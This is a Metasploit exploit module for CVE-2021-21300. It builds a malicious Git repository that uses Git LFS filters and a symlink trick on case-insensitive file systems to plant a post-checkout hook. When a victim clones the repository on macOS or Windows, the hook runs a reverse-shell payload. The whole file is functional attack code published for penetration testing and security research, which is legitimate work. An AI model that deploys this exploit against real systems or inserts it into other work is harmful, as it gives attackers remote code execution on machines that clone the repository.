##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Git
  include Msf::Exploit::Git::HTTP
  include Msf::Exploit::Git::Lfs::Response
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Git LFS Clone Command Exec',
        'Description' => %q{
          Git clients that support delay-capable clean / smudge
          filters and symbolic links on case-insensitive file systems are
          vulnerable to remote code execution while cloning a repository.

          Usage of clean / smudge filters through Git LFS and a
          case-insensitive file system changes the checkout order
          of repository files which enables the placement of a Git hook
          in the `.git/hooks` directory. By default, this module writes
          a `post-checkout` script so that the payload will automatically
          be executed upon checkout of the repository.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Johannes Schindelin', # Discovery
          'Matheus Tavares', # Discovery
          'Shelby Pace' # Metasploit module
        ],
        'References' =>
          [
            [ 'CVE', '2021-21300' ],
            [ 'URL', 'https://seclists.org/fulldisclosure/2021/Apr/60' ],
            [ 'URL', 'https://twitter.com/Foone/status/1369500506469527552?s=20' ]
          ],
        'DisclosureDate' => '2021-04-26',
        'Platform' => [ 'unix', 'win' ],
        'Arch' => ARCH_CMD,
        'Targets' =>
          [
            [
              'MacOS',
              {
                'Platform' => [ 'unix' ],
                'Arch' => ARCH_CMD,
                'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
              }
            ],
            [
              'Windows Powershell',
              {
                'Platform' => [ 'win' ],
                'Arch' => ARCH_CMD,
                'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }
              }
            ]
          ],
        'DefaultTarget' => 0,
        'Notes' =>
        {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]
        }
      )
    )

    register_advanced_options(
      [
        OptString.new('GIT_URI', [ false, 'The URI to use as the malicious Git instance (empty for random)', '' ]),
        OptString.new('GIT_HOOK', [ false, 'The Git hook to use to trigger the payload', 'post-checkout' ])
      ]
    )

    deregister_options('RHOSTS', 'RPORT')
  end

  def setup_repo_structure
    link_content = '.git/hooks'
    link_name = Rex::Text.rand_text_alpha(8..12).downcase
    link_obj = GitObject.build_blob_object(link_content)

    dir_name = link_name.upcase
    git_attr = '.gitattributes'

    git_hook = datastore['GIT_HOOK']
    @hook_payload = payload.encoded
    ptr_file = generate_pointer_file(@hook_payload)
    hardcoded_uripath("/#{Digest::SHA256.hexdigest(@hook_payload)}")

    # need to initially send the pointer file
    # then send the actual object when Git LFS requests it
    git_hook_ptr = GitObject.build_blob_object(ptr_file)

    git_attr_content = "#{dir_name}/#{git_hook} filter=lfs diff=lfs merge=lfs"
    git_attr_obj = GitObject.build_blob_object(git_attr_content)

    sub_file_content = Rex::Text.rand_text_alpha(0..150)
    sub_file_name = Rex::Text.rand_text_alpha(8..12)
    sub_file_obj = GitObject.build_blob_object(sub_file_content)

    # create subdirectory which holds payload
    sub_tree =
      [
        {
          mode: '100644',
          file_name: sub_file_name,
          sha1: sub_file_obj.sha1
        },
        {
          mode: '100755',
          file_name: git_hook,
          sha1: git_hook_ptr.sha1
        }
      ]

    sub_tree_obj = GitObject.build_tree_object(sub_tree)

    # root of repository
    tree_ent =
      [
        {
          mode: '100644',
          file_name: git_attr,
          sha1: git_attr_obj.sha1
        },
        {
          mode: '040000',
          file_name: dir_name,
          sha1: sub_tree_obj.sha1
        },
        {
          mode: '120000',
          file_name: link_name,
          sha1: link_obj.sha1
        }
      ]
    tree_obj = GitObject.build_tree_object(tree_ent)
    commit = GitObject.build_commit_object(tree_obj.sha1)

    @git_objs =
      [
        commit, tree_obj, sub_tree_obj,
        sub_file_obj, git_attr_obj, git_hook_ptr,
        link_obj
      ]

    @refs =
      {
        'HEAD' => 'refs/heads/master',
        'refs/heads/master' => commit.sha1
      }
  end

  def create_git_uri
    "/#{Faker::App.name.downcase}.git".gsub(' ', '-')
  end

  def primer
    @git_repo_uri = datastore['GIT_URI'].empty? ? create_git_uri : datastore['GIT_URI']
    @git_addr = URI.parse(get_uri).merge(@git_repo_uri)
    print_status("Git repository to clone: #{@git_addr}")
    hardcoded_uripath(@git_repo_uri)
    setup_repo_structure
  end

  def on_request_uri(cli, req)
    git_mtch = req.uri.match(/(?<svc>git-\w+-pack)/)
    lfs_mtch = req.uri.match(%r{info/lfs})
    lfs_get_mtch = req.uri.match(%r{/[a-z0-9]{64}})

    unless git_mtch || lfs_mtch || lfs_get_mtch
      fail_with(Failure::UnexpectedReply, 'Unexpected request from Git')
    end

    if git_mtch
      handle_git_objects(cli, req, git_mtch[:svc])
    else
      handle_lfs_objects(cli, req)
    end
  end

  def handle_git_objects(cli, req, svc_req)
    unless svc_req && svc_req == 'git-upload-pack'
      fail_with(Failure::UnexpectedReply, 'Git client did not perform a clone')
    end

    case req.method
    when 'GET'
      resp = Msf::Exploit::Git::HTTP.generate_clone_response(nil, @refs)
      print_status('Sending response advertisement for clone')
      cli.send_response(resp)
    when 'POST'
      wants, _haves = Msf::Exploit::Git::HTTP.parse_want_have_list(req)
      fail_with(Failure::UnexpectedReply, 'Client did not send list of wants') if wants.empty?
      resp = Msf::Exploit::Git::HTTP.generate_want_have_response(wants, @git_objs)
      print_status('Sending client its requested objects')
      cli.send_response(resp)
    end
  end

  def handle_lfs_objects(cli, req)
    case req.method
    when 'GET'
      print_status('Sending payload data...')
      lfs_content_res = Msf::Exploit::Git::Lfs::Response.from_lfs_request(req, @git_objs, @git_addr.to_s)
      cli.send_response(lfs_content_res)
    when 'POST'
      git_hook_obj = GitObject.build_blob_object(@hook_payload)
      @git_objs << git_hook_obj

      print_status('Sending LFS object...')
      lfs_response = Msf::Exploit::Git::Lfs::Response.from_lfs_request(req, @git_objs, @git_addr.to_s)
      cli.send_response(lfs_response)
    end
  end
end
